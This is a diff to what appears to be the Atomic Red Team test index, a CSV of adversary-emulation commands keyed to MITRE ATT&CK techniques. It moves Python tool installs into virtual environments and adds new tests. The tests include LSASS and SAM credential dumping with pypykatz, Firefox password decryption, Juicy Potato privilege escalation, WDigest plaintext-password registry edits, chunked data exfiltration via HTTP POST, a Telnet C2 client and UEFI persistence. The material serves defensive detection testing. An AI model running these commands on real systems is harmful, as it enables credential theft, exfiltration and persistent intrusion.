@@ -502,7 +502,7 @@ T1046,Network Service Discovery,Port Scan using python,6ca45b04-9f15-4424-b9d3-8
 ",windows,,,"python ""#{filename}"" -i #{host_ip}
 ",powershell,,,,powershell,"dependencies.0.description: Check if python exists on the machine
 
-dependencies.0.prereq_command: if (python --version) {exit 0} else {exit 1}
+dependencies.0.prereq_command: if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
 
 dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
 invoke-webrequest ""https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe""
@@ -3164,30 +3164,37 @@ reg save HKLM\security %temp%\security
 del %temp%\system >nul 2> nul
 del %temp%\security >nul 2> nul
 ",,,
-T1003.002,OS Credential Dumping: Security Account Manager,Registry parse with pypykatz,a96872b2-cbf3-46cf-8eb4-27e8c0e85263,"Parses registry hives to obtain stored credentials
-",windows,,,"pypykatz live registry
-",command_prompt,True,,,command_prompt,"dependencies.0.description: Computer must have python 3 installed
+T1003.002,OS Credential Dumping: Security Account Manager,Registry parse with pypykatz,a96872b2-cbf3-46cf-8eb4-27e8c0e85263,"Parses registry hives to obtain stored credentials.
 
-dependencies.0.prereq_command: py -3 --version >nul 2>&1
-exit /b %errorlevel%
+Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.
+",windows,,,"""#{venv_path}\Scripts\pypykatz"" live lsa 
+",command_prompt,True,,,powershell,"dependencies.0.description: Computer must have python 3 installed
 
-dependencies.0.get_prereq_command: echo ""Python 3 must be installed manually""
+dependencies.0.prereq_command: if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
 
-dependencies.1.description: Computer must have pip installed
+dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
+invoke-webrequest ""https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe""
+Start-Process -FilePath ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"" -ArgumentList ""/quiet InstallAllUsers=1 PrependPath=1 Include_test=0"" -Wait
 
-dependencies.1.prereq_command: py -3 -m pip --version >nul 2>&1
-exit /b %errorlevel%
+dependencies.1.description: Computer must have venv configured at #{venv_path}
 
-dependencies.1.get_prereq_command: echo ""PIP must be installed manually""
+dependencies.1.prereq_command: if (Test-Path -Path ""#{venv_path}"") { exit 0 } else { exit 1 }
 
-dependencies.2.description: pypykatz must be installed and part of PATH
+dependencies.1.get_prereq_command: py -m venv ""#{venv_path}""
 
-dependencies.2.prereq_command: pypykatz -h >nul 2>&1
-exit /b %errorlevel%
+dependencies.2.description: pypykatz must be installed 
 
-dependencies.2.get_prereq_command: pip install pypykatz
+dependencies.2.prereq_command: if (Get-Command ""#{venv_path}\Scripts\pypykatz"" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
 
-",
+dependencies.2.get_prereq_command: & ""#{venv_path}\Scripts\pip.exe"" install --no-cache-dir pypykatz 2>&1 | Out-Null
+
+","input_arguments.venv_path.description: Path to the folder for the tactics venv
+
+input_arguments.venv_path.type: string
+
+input_arguments.venv_path.default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1003_002
+
+"
 T1003.002,OS Credential Dumping: Security Account Manager,esentutl.exe SAM copy,a90c2f4d-6726-444e-99d2-a00cd7c20480,"Copy the SAM hive using the esentutl.exe utility
 This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.
 ",windows,,,"esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}
@@ -4013,6 +4020,34 @@ input_arguments.folder_path.description: Path where the test creates artifacts
 input_arguments.folder_path.type: path
 
 input_arguments.folder_path.default: /tmp/T1030
+
+"
+T1030,Data Transfer Size Limits,Network-Based Data Transfer in Small Chunks,f0287b58-f4bc-40f6-87eb-692e126e7f8f,Simulate transferring data over a network in small chunks to evade detection.,windows,,,"$file = [System.IO.File]::OpenRead(#{source_file_path})
+$chunkSize = #{chunk_size} * 1KB
+$buffer = New-Object Byte[] $chunkSize
+
+while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {
+    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)
+    Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk
+}
+$file.Close()
+",powershell,False,,,,,"input_arguments.source_file_path.description: Path to the source file to transfer.
+
+input_arguments.source_file_path.type: path
+
+input_arguments.source_file_path.default: [User specified]
+
+input_arguments.destination_url.description: URL of the destination server.
+
+input_arguments.destination_url.type: url
+
+input_arguments.destination_url.default: http://example.com
+
+input_arguments.chunk_size.description: Size of each data chunk (in KB).
+
+input_arguments.chunk_size.type: integer
+
+input_arguments.chunk_size.default: 1024
 
 "
 T1057,Process Discovery,Process Discovery - ps,4ff64f0b-aaf2-4866-b39d-38d9791407cc,"Utilize ps to identify processes.
@@ -6331,6 +6366,35 @@ input_arguments.dylib_file.type: path
 input_arguments.dylib_file.default: /tmp/T1574006MOS.dylib
 
 "
+T1059,Command and Scripting Interpreter,AutoIt Script Execution,a9b93f17-31cb-435d-a462-5e838a2a6026,"An adversary may attempt to execute suspicious or malicious script using AutoIt software instead of regular terminal like powershell or cmd. Calculator will popup when the script is executed successfully.
+",windows,,,"Start-Process -FilePath ""#{autoit_path}"" -ArgumentList ""#{script_path}""
+",powershell,,,,powershell,"dependencies.0.description: AutoIt executable file must exist on disk at the specified location (#{autoit_path})
+
+dependencies.0.prereq_command: if(Test-Path ""#{autoit_path}"") {
+    exit 0
+} else {
+    exit 1
+}
+
+dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
+$AutoItURL = ""https://www.autoitscript.com/cgi-bin/getfile.pl?autoit3/autoit-v3-setup.exe""
+$InstallerPath = ""$PathToAtomicsFolder\..\ExternalPayloads\autoit-v3-setup.exe""
+Invoke-WebRequest -Uri $AutoItURL -OutFile $InstallerPath
+Start-Process -FilePath $InstallerPath -ArgumentList ""/S"" -Wait
+
+","input_arguments.script_path.description: AutoIt Script Path
+
+input_arguments.script_path.type: path
+
+input_arguments.script_path.default: PathToAtomicsFolder\T1059\src\calc.au3
+
+input_arguments.autoit_path.description: AutoIt Executable File Path
+
+input_arguments.autoit_path.type: path
+
+input_arguments.autoit_path.default: C:\Program Files (x86)\AutoIt3\AutoIt3.exe
+
+"
 T1550.003,Use Alternate Authentication Material: Pass the Ticket,Mimikatz Kerberos Ticket Attack,dbf38128-7ba7-4776-bedf-cc2eed432098,"Similar to PTH, but attacking Kerberos
 ",windows,,,"""#{mimikatz_exe}"" ""kerberos::ptt #{ticket}""
 ",command_prompt,,,,powershell,"dependencies.0.description: Mimikatz must exist on disk at specified location (#{mimikatz_exe})
@@ -6411,6 +6475,34 @@ input_arguments.rubeus_url.description: URL of Rubeus executable
 input_arguments.rubeus_url.type: url
 
 input_arguments.rubeus_url.default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+
+"
+T1071,Application Layer Protocol,Telnet C2,3b0df731-030c-4768-b492-2a3216d90e53,"An adversary may establish telnet communication from compromised endpoint to command and control (C2) server to be able to operate more attack on objectives.
+",windows,,,"#{client_path} #{server_ip} --port #{server_port}
+",powershell,,,,powershell,"dependencies.0.description: Command and Control (C2) server cam be established by running PathToAtomicsFolder\T1071\bin\telnet_server.exe on specified server with specified IP that must be reachable by client (telnet_client.exe)
+
+dependencies.0.prereq_command: $connection = Test-NetConnection -ComputerName #{server_ip} -Port #{server_port}
+if ($connection.TcpTestSucceeded) {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: Write-Host ""Setup C2 server manually""
+
+","input_arguments.server_ip.description: C2 server IP or URL
+
+input_arguments.server_ip.type: url
+
+input_arguments.server_ip.default: 127.0.0.1
+
+input_arguments.client_path.description: Client agent path
+
+input_arguments.client_path.type: url
+
+input_arguments.client_path.default: PathToAtomicsFolder\T1071\bin\telnet_client.exe
+
+input_arguments.server_port.description: C2 server port
+
+input_arguments.server_port.type: Integer
+
+input_arguments.server_port.default: 23
 
 "
 T1127,Trusted Developer Utilities Proxy Execution,Lolbin Jsc.exe compile javascript to exe,1ec1c269-d6bd-49e7-b71b-a461f7fa7bc8,"Use jsc.exe to compile javascript code stored in scriptfile.js and output scriptfile.exe.
@@ -6538,6 +6630,44 @@ dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolde
 Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\BadPotato.exe"" ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/bin/BadPotato.exe?raw=true""
 
 ",
+T1134.001,Access Token Manipulation: Token Impersonation/Theft,Juicy Potato,f095e373-b936-4eb4-8d22-f47ccbfbe64a,"This Atomic utilizes Juicy Potato to obtain privilege escalation. 
+Upon successful execution of this test, a vulnerable CLSID will be used to execute a process with system permissions.
+This tactic has been previously observed in SnapMC Ransomware, amongst numerous other campaigns. 
+[Reference](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/)",windows,,,"cmd /c '#{potato_path}' -l '#{listening_port}' -t * -p '#{target_exe}' -c '#{target_CLSID}'
+",powershell,True,,"get-ciminstance Win32_Process | where-object { $_.Path -eq ""#{target_exe}"" } | invoke-cimmethod -methodname ""terminate"" | out-null
+get-ciminstance Win32_Process | where-object { $_.Path -eq ""#{potato_path}"" } | invoke-cimmethod -methodname ""terminate"" | out-null
+",powershell,"dependencies.0.description: JuicyPotato.exe must exist on disk
+
+dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\JuicyPotato.exe"") {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
+Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\JuicyPotato.exe"" ""https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe""
+
+","input_arguments.potato_path.description: Path to the JuicyPotato.exe file
+
+input_arguments.potato_path.type: path
+
+input_arguments.potato_path.default: PathToAtomicsFolder\..\ExternalPayloads\JuicyPotato.exe
+
+input_arguments.listening_port.description: COM server listen port
+
+input_arguments.listening_port.type: integer
+
+input_arguments.listening_port.default: 7777
+
+input_arguments.target_exe.description: Target executable to launch with system privileges
+
+input_arguments.target_exe.type: path
+
+input_arguments.target_exe.default: $env:windir\system32\notepad.exe
+
+input_arguments.target_CLSID.description: Vulnerable CLSID to impersonate privileges
+
+input_arguments.target_CLSID.type: string
+
+input_arguments.target_CLSID.default: {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
+
+"
 T1204.002,User Execution: Malicious File,OSTap Style Macro Execution,8bebc690-18c7-4549-bc98-210f7019efff,"This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.
 Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
 This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.
@@ -7288,30 +7418,26 @@ foreach ($ip in 1..255 | % { ""$firstOctet.$secondOctet.$thirdOctet.$_"" } ) {cm
 T1018,Remote System Discovery,Remote System Discovery - adidnsdump,95e19466-469e-4316-86d2-1dc401b5a959,"This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks
 Python 3 and adidnsdump must be installed, use the get_prereq_command's to meet the prerequisites for this test.
 Successful execution of this test will list dns zones in the terminal.
-",windows,,,"adidnsdump -u #{user_name} -p #{acct_pass} --print-zones #{host_name}
+",windows,,,"""#{venv_path}\Scripts\adidnsdump"" -u #{user_name} -p #{acct_pass} --print-zones #{host_name}
 ",command_prompt,True,,,powershell,"dependencies.0.description: Computer must have python 3 installed
 
-dependencies.0.prereq_command: if (python --version) {exit 0} else {exit 1}
+dependencies.0.prereq_command: if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
 
 dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
 invoke-webrequest ""https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe""
 Start-Process -FilePath ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"" -ArgumentList ""/quiet InstallAllUsers=1 PrependPath=1 Include_test=0"" -Wait
 
-dependencies.1.description: Computer must have pip installed
+dependencies.1.description: Computer must have venv configured at #{venv_path}
 
-dependencies.1.prereq_command: if (pip3 -V) {exit 0} else {exit 1}
+dependencies.1.prereq_command: if (Test-Path -Path ""#{venv_path}"" ) { exit 0 } else { exit 1 }
 
-dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
-invoke-webrequest ""https://bootstrap.pypa.io/ez_setup.py"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\ez_setup.py""      
-invoke-webrequest ""https://bootstrap.pypa.io/get-pip.py"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\get-pip.py""
-cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\ez_setup.py""
-cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\get-pip.py""
+dependencies.1.get_prereq_command: py -m venv ""#{venv_path}""
 
-dependencies.2.description: adidnsdump must be installed and part of PATH
+dependencies.2.description: adidnsdump must be installed
 
-dependencies.2.prereq_command: if (cmd /c adidnsdump -h) {exit 0} else {exit 1}
+dependencies.2.prereq_command: if (Get-Command ""#{venv_path}\Scripts\adidnsdump"" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
 
-dependencies.2.get_prereq_command: pip3 install adidnsdump
+dependencies.2.get_prereq_command: & ""#{venv_path}\Scripts\pip.exe"" install --no-cache-dir adidnsdump 2>&1 | Out-Null
 
 ","input_arguments.user_name.description: username including domain.
 
@@ -7330,6 +7456,12 @@ input_arguments.host_name.description: hostname or ip address to connect to.
 input_arguments.host_name.type: string
 
 input_arguments.host_name.default: 192.168.1.1
+
+input_arguments.venv_path.description: Path to the folder for the tactics venv
+
+input_arguments.venv_path.type: string
+
+input_arguments.venv_path.default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1018
 
 "
 T1018,Remote System Discovery,Adfind - Enumerate Active Directory Computer Objects,a889f5be-2d54-4050-bd05-884578748bb4,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects
@@ -8541,6 +8673,11 @@ Additionally, open Registry Editor to view the modified entry in HKLM\SYSTEM\Cur
 ",windows,,,"reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
 ",command_prompt,True,,"reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1
 ",,,
+T1112,Modify Registry,Use Powershell to Modify registry to store logon credentials,68254a85-aa42-4312-a695-38b7276307f8,"Sets registry key using Powershell that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).
+Open Registry Editor to view the modified entry in HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest.
+",windows,,,"Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1' -ErrorAction Ignore
+",powershell,True,,"Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '0' -ErrorAction Ignore
+",,,
 T1112,Modify Registry,Add domain to Trusted sites Zone,cf447677-5a4e-4937-a82c-e47d254afd57,"Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.
 Upon execution, details of the new registry entries will be displayed.
 Additionally, open Registry Editor to view the modified entry in HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\.
@@ -9146,35 +9283,37 @@ T1003.001,OS Credential Dumping: LSASS Memory,LSASS read with pypykatz,c37bc535-
 Python 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.
 
 Successful execution of this test will display multiple usernames and passwords/hashes to the screen.
-",windows,,,"pypykatz live lsa
-",command_prompt,True,,,command_prompt,"dependencies.0.description: Computer must have python 3 installed
 
-dependencies.0.prereq_command: py -3 --version >nul 2>&1
-exit /b %errorlevel%
+Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.
+",windows,,,"""#{venv_path}\Scripts\pypykatz"" live lsa 
+",command_prompt,True,,"del ""%temp%\nanodump.dmp"" > nul 2> nul
+",powershell,"dependencies.0.description: Computer must have python 3 installed
+
+dependencies.0.prereq_command: if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
 
 dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
 invoke-webrequest ""https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe""
 Start-Process -FilePath ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"" -ArgumentList ""/quiet InstallAllUsers=1 PrependPath=1 Include_test=0"" -Wait
 
-dependencies.1.description: Computer must have pip installed
+dependencies.1.description: Computer must have venv configured at #{venv_path}
 
-dependencies.1.prereq_command: py -3 -m pip --version >nul 2>&1
-exit /b %errorlevel%
+dependencies.1.prereq_command: if (Test-Path -Path ""#{venv_path}"") { exit 0 } else { exit 1 }
 
-dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
-invoke-webrequest ""https://bootstrap.pypa.io/ez_setup.py"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\ez_setup.py""      
-invoke-webrequest ""https://bootstrap.pypa.io/get-pip.py"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\get-pip.py""
-cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\ez_setup.py""
-cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\get-pip.py""
+dependencies.1.get_prereq_command: py -m venv ""#{venv_path}""
 
-dependencies.2.description: pypykatz must be installed and part of PATH
+dependencies.2.description: pypykatz must be installed 
 
-dependencies.2.prereq_command: pypykatz -h >nul 2>&1
-exit /b %errorlevel%
+dependencies.2.prereq_command: if (Get-Command ""#{venv_path}\Scripts\pypykatz"" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
 
-dependencies.2.get_prereq_command: pip install pypykatz
+dependencies.2.get_prereq_command: & ""#{venv_path}\Scripts\pip.exe"" install --no-cache-dir pypykatz 2>&1 | Out-Null
 
-",
+","input_arguments.venv_path.description: Path to the folder for the tactics venv
+
+input_arguments.venv_path.type: string
+
+input_arguments.venv_path.default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1003_001
+
+"
 T1003.001,OS Credential Dumping: LSASS Memory,Dump LSASS.exe Memory using Out-Minidump.ps1,6502c8f0-b775-4dbd-9193-1298f56b6781,"The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure
 powershell implementation that leverages the MiniDumpWriteDump Win32 API call.
 Upon successful execution, you should see the following file created $env:TEMP\lsass_*.dmp.
@@ -9505,6 +9644,12 @@ input_arguments.MSP360_Connect_Path.type: path
 input_arguments.MSP360_Connect_Path.default: $env:ProgramFiles\Connect\Connect.exe
 
 "
+T1219,Remote Access Software,RustDesk Files Detected Test on Windows,f1641ba9-919a-4323-b74f-33372333bf0e,"An adversary may attempt to trick the user into downloading RustDesk and use this to maintain access to the machine. 
+Download of RustDesk installer will be at the destination location when successfully executed.
+",windows,,,"$file = Join-Path $env:USERPROFILE ""Desktop\rustdesk-1.2.3-1-x86_64.exe""
+Invoke-WebRequest  -OutFile $file https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe
+Start-Process -FilePath $file ""/S""",powershell,,,"$file = Join-Path $env:USERPROFILE ""Desktop\rustdesk-1.2.3-1-x86_64.exe""
+Remove-Item $file1 -ErrorAction Ignore",,,
 T1546.014,Event Triggered Execution: Emond,Persistance with Event Monitor - emond,23c9c127-322b-4c75-95ca-eff464906114,"Establish persistence via a rule run by OSX's emond (Event Monitor) daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
 ",macos,,,"sudo cp ""#{plist}"" /etc/emond.d/rules/T1546.014_emond.plist
 sudo touch /private/var/db/emondClients/T1546.014
@@ -9587,6 +9732,12 @@ This technique was observed in a [TheDFIRReport case](https://thedfirreport.com/
 where the threat actor enumerated the Windows Security audit log to determine user accounts and associated IPv4 addresses.
 
 Successful execution will save matching log events to the users temp folder.",windows,,,powershell -c {get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\T1654_events.txt},powershell,True,,"powershell -c ""remove-item $env:temp\T1654_events.txt -ErrorAction Ignore""",,,
+T1654,Log Enumeration,Enumerate Windows Security Log via WevtUtil,fef0ace1-3550-4bf1-a075-9fea55a778dd,"WevtUtil is a command line tool that can be utilised by adversaries to gather intelligence on a targeted Windows system's logging infrastructure. 
+
+By executing this command, malicious actors can enumerate all available event logs, including both default logs such as Application, Security, and System
+as well as any custom logs created by administrators. 
+
+This information provides valuable insight into the system's logging mechanisms, potentially allowing attackers to identify gaps or weaknesses in the logging configuration",windows,,,wevtutil enum-logs,command_prompt,,,,,,
 T1072,Software Deployment Tools,Radmin Viewer Utility,b4988cad-6ed2-434d-ace5-ea2670782129,"An adversary may use Radmin Viewer Utility to remotely control Windows device, this will start the radmin console.
 ",windows,,,"""%PROGRAMFILES(x86)%/#{radmin_exe}""
 ",command_prompt,True,,,powershell,"dependencies.0.description: Radmin Viewer Utility must be installed at specified location (#{radmin_exe})
@@ -11876,6 +12027,15 @@ net localgroup
 T1087.001,Account Discovery: Local Account,Enumerate logged on users via CMD (Local),a138085e-bfe5-46ba-a242-74a6fb884af3,"Enumerate logged on users. Upon execution, logged on users will be displayed.
 ",windows,,,"query user
 ",command_prompt,,,,,,
+T1542.001,Pre-OS Boot: System Firmware,UEFI Persistence via Wpbbin.exe File Creation,b8a49f03-e3c4-40f2-b7bb-9e8f8fdddbf1,"Creates Wpbbin.exe in %systemroot%. This technique can be used for UEFI-based pre-OS boot persistence mechanisms.
+- https://grzegorztworek.medium.com/using-uefi-to-inject-executable-files-into-bitlocker-protected-drives-8ff4ca59c94c
+- http://download.microsoft.com/download/8/a/2/8a2fb72d-9b96-4e2d-a559-4a27cf905a80/windows-platform-binary-table.docx
+- https://github.com/tandasat/WPBT-Builder
+",windows,,,"echo ""Creating %systemroot%\wpbbin.exe""      
+New-Item -ItemType File -Path ""$env:SystemRoot\System32\wpbbin.exe""
+",powershell,True,,"echo ""Removing %systemroot%\wpbbin.exe"" 
+Remove-Item -Path ""$env:SystemRoot\System32\wpbbin.exe""
+",,,
 T1552.007,Kubernetes List Secrets,List All Secrets,31e794c4-48fd-4a76-aca4-6587c155bc11,"A Kubernetes secret is an object that lets users store and manage sensitive information, such as passwords and connection strings in the cluster. Secrets can be consumed by reference in the pod configuration. Attackers who have permissions to retrieve the secrets from the API server (by using the pod service account, for example) can access sensitive information that might include credentials to various services or provide further access to the cluster.
 [More information about secrets](https://kubernetes.io/docs/concepts/configuration/secret/).
 
@@ -18113,22 +18273,17 @@ Stop-Process -Name msedge
 ",
 T1555.003,Credentials from Password Stores: Credentials from Web Browsers,Decrypt Mozilla Passwords with Firepwd.py,dc9cd677-c70f-4df5-bd1c-f114af3c2381,"Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.
 Upon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. 
+
+Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.
 ",windows,,,"$PasswordDBLocation = get-childitem -path ""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\""
-cmd /c #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}
+cmd /c #{venv_path}\Scripts\python.exe #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}
 cat #{Out_Filepath}
 ",powershell,,,"Remove-Item -Path ""#{Out_Filepath}"" -erroraction silentlycontinue   
-",powershell,"dependencies.0.description: Firepwd must exist at #{Firepwd_Path}
+",powershell,"dependencies.0.description: Firefox profile directory must be present
 
-dependencies.0.prereq_command: if (Test-Path ""#{Firepwd_Path}"") {exit 0} else {exit 1}
+dependencies.0.prereq_command: if (get-childitem -path ""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"" -erroraction silentlycontinue) {exit 0} else {exit 1}
 
-dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
-Invoke-WebRequest ""https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py"" -outfile ""#{Firepwd_Path}""
-
-dependencies.1.description: Firefox profile directory must be present
-
-dependencies.1.prereq_command: if (get-childitem -path ""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"" -erroraction silentlycontinue) {exit 0} else {exit 1}
-
-dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
+dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
 Invoke-WebRequest ""https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\firefox.msi""
 msiexec.exe /i ""PathToAtomicsFolder\..\ExternalPayloads\firefox.msi"" /quiet
 sleep -s 30
@@ -18136,54 +18291,52 @@ start-process ""$env:programfiles\Mozilla Firefox\firefox.exe"".
 sleep -s 5
 stop-process -name ""firefox""
 
-dependencies.2.description: Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}
+dependencies.1.description: Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}
 
-dependencies.2.prereq_command: if (Test-Path ""#{VS_CMD_Path}"") {exit 0} else {exit 1}
+dependencies.1.prereq_command: if (Test-Path ""#{VS_CMD_Path}"") {exit 0} else {exit 1}
 
-dependencies.2.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
+dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
 invoke-webrequest ""https://aka.ms/vs/17/release/vs_BuildTools.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\VS_BuildTools.exe""
 write-host ""Visual Studio Build Tools (Desktop Development with C++) must be installed manually. Please run the installer from PathToAtomicsFolder\..\ExternalPayloads\VS_BuildTools.exe.""
 
-dependencies.3.description: Python must be installed
+dependencies.2.description: Python must be installed
 
-dependencies.3.prereq_command: if (Test-Path ""#{Python_Path}"") {exit 0} else {exit 1}
+dependencies.2.prereq_command: if (Test-Path ""#{Python_Path}"") {exit 0} else {exit 1}
 
-dependencies.3.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
+dependencies.2.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
 invoke-webrequest ""https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe""
 Start-Process -FilePath ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"" -ArgumentList ""/quiet InstallAllUsers=1 PrependPath=1 Include_test=0"" -Wait
 
-dependencies.4.description: Pip must be installed.
+dependencies.3.description: Computer must have venv configured at #{venv_path}
 
-dependencies.4.prereq_command: $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(""Path"",""Machine"") + "";"" + [System.Environment]::GetEnvironmentVariable(""Path"",""User""))
-if (pip -v) {exit 0} else {exit 1}
+dependencies.3.prereq_command: if (Test-Path -Path ""#{venv_path}"") { exit 0 } else { exit 1 }
+
+dependencies.3.get_prereq_command: py -m venv ""#{venv_path}""
+
+dependencies.4.description: Firepwd must exist at #{Firepwd_Path}
+
+dependencies.4.prereq_command: if (Test-Path ""#{Firepwd_Path}"") {exit 0} else {exit 1}
 
 dependencies.4.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
-invoke-webrequest ""https://bootstrap.pypa.io/ez_setup.py"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\ez_setup.py""      
-invoke-webrequest ""https://bootstrap.pypa.io/get-pip.py"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\get-pip.py""
-cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\ez_setup.py""
